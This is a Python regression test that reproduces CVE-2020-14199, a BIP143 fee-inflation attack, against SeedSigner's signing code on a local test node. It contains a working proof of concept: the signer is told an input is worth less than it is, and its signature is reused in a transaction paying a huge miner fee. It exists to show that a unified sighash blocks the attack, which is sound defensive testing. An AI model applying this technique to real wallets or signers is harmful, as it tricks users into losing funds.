#!/usr/bin/env python3
"""CVE-2020-14199 demonstrated against a real signer and a real node.

The attack: a signing device is told one input is worth far less than it is,
displays a small fee, signs, and its signature is then reused in the real
transaction, which pays an enormous fee to a miner.

BIP143 commits to the amount of the input being signed but not to the others,
so the lie never enters the digest and the signature stays valid. The unified
sighash commits to every spent amount, so the same lie invalidates it.
"""
import os
import sys

# SeedSigner's source, so its own Seed/PSBTParser are exercised rather than a
# reimplementation. embit comes from the environment, i.e. the pinned
# dependency, so this tests what requirements.txt actually installs.
_SS = os.environ.get("SEEDSIGNER_SRC")
if not _SS:
    _SS = os.path.join(os.path.dirname(__file__), "..", "..", "src")
sys.path.insert(0, os.path.abspath(_SS))

from test_framework.test_framework import BitcoinTestFramework
from test_framework.wallet import MiniWallet

from embit.psbt import PSBT
from embit.transaction import Transaction, TransactionInput, TransactionOutput, SIGHASH
from embit import script, ec

ACTIVATION_HEIGHT = 150
HONEST, LIE = 10 * 100_000_000, 1_000_000     # 10 BTC really, 0.01 BTC claimed
SMALL = 1 * 100_000_000


class CVE202014199(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.setup_clean_chain = True
        self.extra_args = [[f"-testactivationheight=blake2b@{ACTIVATION_HEIGHT}", "-corepolicy=0", "-acceptnonstdtxn=1"]]

    def build(self, utxos, out_value, sink):
        tx = Transaction(
            vin=[TransactionInput(bytes.fromhex(u["txid"]), u["sent_vout"], sequence=0xFFFFFFFE) for u in utxos],
            vout=[TransactionOutput(out_value, sink)],
        )
        return tx

    def run_test(self):
        node = self.nodes[0]
        wallet = MiniWallet(node)
        self.generate(wallet, ACTIVATION_HEIGHT + 10)

        victim = ec.PrivateKey(bytes.fromhex("44" * 32))       # the device's key
        attacker = ec.PrivateKey(bytes.fromhex("55" * 32))
        v_spk, a_spk = script.p2wpkh(victim.get_public_key()), script.p2wpkh(attacker.get_public_key())
        sink = script.p2wpkh(ec.PrivateKey(bytes.fromhex("66" * 32)).get_public_key())

        # input 0: the victim's, small. input 1: attacker-controlled, large.
        u0 = wallet.send_to(from_node=node, scriptPubKey=bytes(v_spk.data), amount=SMALL)
        u1 = wallet.send_to(from_node=node, scriptPubKey=bytes(a_spk.data), amount=HONEST)
        self.generate(wallet, 1)
        self.log.info(f"victim input {SMALL/1e8} BTC, attacker input {HONEST/1e8} BTC (device will be told {LIE/1e8})")

        for label, ht in (("BIP143 segwit v0", SIGHASH.ALL),
                          ("unified opt-in", SIGHASH.ALL | SIGHASH.UNIFIED)):
            tx = self.build([u0, u1], SMALL + LIE - 10_000, sink)

            # what the device is shown: input 1 understated
            lied = PSBT(tx)
            lied.inputs[0].witness_utxo = TransactionOutput(SMALL, v_spk)
            lied.inputs[1].witness_utxo = TransactionOutput(LIE, a_spk)
            shown_fee = (SMALL + LIE) - (SMALL + LIE - 10_000)
            sig0 = victim.sign(lied.sighash(0, sighash=ht)).serialize() + bytes([ht])

            # the real transaction, with input 1 at its true value
            real = PSBT(tx)
            real.inputs[0].witness_utxo = TransactionOutput(SMALL, v_spk)
            real.inputs[1].witness_utxo = TransactionOutput(HONEST, a_spk)
            sig1 = attacker.sign(real.sighash(1, sighash=ht)).serialize() + bytes([ht])
            real_fee = (SMALL + HONEST) - (SMALL + LIE - 10_000)

            tx.vin[0].witness = script.Witness([sig0, victim.get_public_key().sec()])
            tx.vin[1].witness = script.Witness([sig1, attacker.get_public_key().sec()])
            res = node.testmempoolaccept([tx.serialize().hex()], 0)[0]  # maxfeerate=0: judge the signature, not fee policy

            self.log.info(f"{label}: device shown fee {shown_fee/1e8} BTC, real fee {real_fee/1e8} BTC")
            self.log.info(f"  victim's signature valid in the real transaction: {res['allowed']}"
                          f" {res.get('reject-reason','')}")
            if ht == SIGHASH.ALL:
                assert res["allowed"], "the attack should succeed under BIP143"
                self.log.info("  ATTACK SUCCEEDS: the lie never entered the digest")
            else:
                assert not res["allowed"], "the unified sighash must block this"
                assert "missing-inputs" not in res.get("reject-reason", ""), res
                self.log.info("  ATTACK BLOCKED: every spent amount is committed to")


if __name__ == "__main__":
    CVE202014199(__file__).main()
